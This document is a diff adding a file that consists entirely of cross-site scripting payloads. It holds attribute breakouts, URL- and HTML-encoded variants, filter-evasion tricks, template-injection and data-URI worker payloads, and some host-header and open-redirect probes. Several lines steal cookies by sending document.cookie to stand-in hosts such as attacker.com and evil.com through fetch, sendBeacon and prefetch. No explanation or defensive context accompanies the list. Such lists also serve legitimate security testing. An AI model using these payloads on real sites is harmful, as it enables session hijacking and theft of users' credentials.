@@ -1,0 +1,45 @@
+" onfocus="alert(1);this.setSelectionRange(0, this.value.length);" autofocus="
+%22%20onfocus%3d%22alert(1)%3bthis.setSelectionRange(0%2c%20this.value.length)%3b%22%20autofocus%3d%22
+&#34; onfocus=&#34;alert(1);this.setSelectionRange(0, this.value.length);&#34; autofocus=&#34;
+"><svg/onload=alert(1)>
+%22%3e%3csvg%2fonload%3d%22alert(1)%22%3e
+&#34;&#62;&#60;svg&#47;onload&#61;&#34;alert(1)&#34;&#62;
+" onmouseover="alert(1)" x="
+%22%20onmouseover%3d%22alert(1)%22%20x%3d%22
+javascript:alert(1)
+javascript%3aalert(1)
+javascript&#58;alert(1)
+%00"><script>alert(1)</script>
+%uFF02><img src=x onerror=alert(1)>
+\"><script>alert(1)</script>
+%C2%A2"><script>alert(1)</script>
+{{constructor.constructor('alert(1)')()}}
+document.body.innerHTML='<img src=x onerror=alert(1)>'
+fetch('/xss',{method:'POST',body:document.cookie})
+<iframe srcdoc="<script>alert(1)</script>">
+<object data="javascript:alert(1)">
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<div onpointerover=alert(1)>XSS</div>
+<details/open/ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<body onscroll=alert(1)><br><br><br><br>
+navigator.serviceWorker.register('data:,alert(1)')
+new Worker('data:,alert(1)')
+import('data:,alert(1)')
+Transfer-Encoding: chunked
+GET / HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com
+http://target.com/%5cevil.com
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src="x:gif" onerror=alert(1)>
+<a href="jAvAsCrIpT:alert(1)">XSS</a>
+<img src=1 alt=al&#x65;rt(1)>
+<script\x20>alert(1)</script>
+<script>fetch('https://attacker.com/?cookie='+document.cookie)</script>
+<img src=x onerror="navigator.sendBeacon('https://attacker.com',document.cookie)">
+<link rel=prefetch href="//evil.com?c=`+document.cookie+`">
+</script><svg/onload=alert(1)>
+<!--<img src=--><img src=x onerror=alert(1)>
+<script>throw onerror=alert,1</script>
+<math><maction actiontype="statusline#https://evil.com" href="javascript:alert(1)">XSS</maction></math>
